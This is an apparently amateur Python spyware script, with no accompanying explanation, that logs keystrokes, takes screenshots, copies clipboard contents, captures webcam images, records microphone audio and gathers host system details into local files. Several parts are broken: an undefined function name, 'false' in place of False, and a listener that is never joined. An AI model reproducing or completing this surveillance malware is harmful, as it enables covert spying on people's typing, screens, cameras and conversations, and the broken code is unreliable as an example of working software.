from pynput.keyboard import *
import socket
from PIL import ImageGrab 
from requests import get 
import platform
import datetime 
import win32clipboard 
import pandas
from cv2 import VideoCapture, imshow, imwrite, waitKey, destroyWindow
import sounddevice
from scipy.io.wavfile import *

keystrokes = [] #store strokes in list 
audio_path="" #add path to save file and add \\ to the end
sound_file="sound.mp3"

def on_press(key):
	key.append(key)
	write_file(key)
	print(key)

def on_release(key):
	if key == Key.esc:
		return false

def write_to_file(data):
	with open("sample.txt","a") as fil:
		for i in data:
			new_data = str(i).replace("'","")
		fil.write(new_data)
		fil.write(" ")


def screenshot():
	img = ImageGrab.grab()
	img.save("spy_screenshot.png")

def clipboard_copy():
	curr_date = datetime.datetime.now()
	with open("clipboard_text.txt", "a") as fil:
		try:
			win32clipboard.OpenClipboard()
			paste_data = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			fil.write("\n")
			fil.write("date and time:" + str(curr_date) + "\n")
			fil.write("Clipboard Data:"+paste_data)
		except:
			fil.write("Can't copy clipboard \n")

def capture_camera():
    cam = VideoCapture(0)
    res, image = cam.read()
    if res:
        imshow("webcam", image)
        imwrite("camera_capture.png", image)
        waitKey(1)
        destroyWindow("webcam")



with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join

date = datetime.date.today()
ip_addr = socket.gethostbyname(socket.gethostname())
cpu = platform.processor()
sys = platform.system()
host_name = socket.gethostname()
version = platform.release()
machine = platform.machine()

data = { 
	'Metric': ['Date','IP Address', 'CPU', 'System & Version', 'Host Name', 'Machine'],
    'Value': [date,ip_addr, cpu, sys + " " + version, host_name, machine]
}

dataFrame = pandas.DataFrame(data)
dataFrame.to_excel("keystrokes.xlsx", index=False)


def microphone():
    cd_audio_rate = 44100 #CDs 48000 for Video and 96000 for HD sound
    time = 10 #adjust time as need be
    record = sounddevice.rec(int(time*cd_audio_rate), samplerate=cd_audio_rate,channels=1) #adjust channels as need
    sounddevice.wait()
    write(audio_path + sound_file, cd_audio_rate, record)

#microphone()

#screenshot()
#capture_camera()
#clipboard_copy()







